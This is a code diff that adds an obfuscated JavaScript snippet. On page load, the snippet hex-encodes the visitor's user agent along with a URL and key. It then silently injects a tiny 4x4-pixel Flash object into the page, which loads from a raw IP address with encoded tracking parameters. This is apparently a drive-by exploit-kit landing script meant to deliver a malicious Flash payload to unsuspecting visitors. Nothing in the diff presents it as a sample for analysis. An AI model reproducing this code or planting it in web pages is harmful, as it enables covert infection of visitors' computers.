@@ -1,0 +1,23 @@
+/*s78497d99608hssfj47460fs*/function hgfgerdfgdf(num, width){/*s62126d95181hfj92347fs*/var vcbcvbnfd = "0123456789abcdef";var hgfgghf = "";/*s21623d55997hfj8778fs*/var hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1);while (num > 0xF) {num = num >>> 4;hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1) + hgfgerdfgdf;}var width = (width ? width : 0); while (hgfgerdfgdf.length < width)hgfgerdfgdf = "0" + hgfgerdfgdf;return hgfgerdfgdf;}/*s85625d28035hfj9015fs*/function ghnvbn(u, k) {var fr=String.fromCharCode;var c="", b="", d="", f=fr(0x20), g=fr(0), v=fr(0x22);/*s95918d66509hfj33948fs*/var app=k+v+f+v+u+v+f+v+navigator.userAgent+v+g+g+g+g;app.length%2 && (app+=g);for (var e = 0; e < app.length; e++) {b = hgfgerdfgdf(app.charCodeAt(e),2);d = hgfgerdfgdf(app.charCodeAt(e+1),2);/*sdhd22344hfs*/c += b + d;/*s68097d30085hfj17044fs*/e += 1;}return c;}/*s7770dfsffd*/
+
+	function hfdf(fus,asd)
+	{
+	var cvbfh = '<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd + '" />';
+	cvbfh = cvbfh + '<!--[if !IE]>-->';
+	cvbfh = cvbfh + '<object type="application/x-shockwave-flash" data="' + fus + '" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd +   '" />';
+	cvbfh = cvbfh + '<!--<![endif]-->';
+	cvbfh = cvbfh + '<!--[if !IE]>--></object><!--<![endif]-->';
+	cvbfh = cvbfh + '</object>';
+
+	var ffert = document.createElement("div");
+	ffert.innerHTML = cvbfh;
+	document.body.appendChild(ffert);
+	} 
+	
+	hfdf("http://188.225.33.192/?MTE0OTE0MDMy&pa=xHzQMrPYbR7FFYDfKPnEUKdEMU3WA0SKwY-ZhazVF5-xFDTGpbH1Fx_spV-dCF-EmvFvdLAHIwGh1UTASwR&ma=kz49aVFsX8quvh0DVnRSYgJWA_BfYZwtN_ZPGRbA8i1ykx7BHecohlhTT6GBXmestW1sZ6Qgalaz7VaCO-w&shop=NDE3OTQwNTg=", ghnvbn("http://188.225.33.192/?NTM0NDE0MTc=&ma=ayj0KGfwRknYdfUg4X9amsj0OAzx6egsTT_BLeMAtNrJuXEuBq2VzymrMkec0lxBKL61ENjOge&pa=xXzQMvWebRXQC53EKvncT6NEMVHRH0CL2YydmrHQefjaeVWkzrLFTF_yozKASASG6_JtdfJRDQ&gift=NDEzNzczNDI=","wexykukusw"));
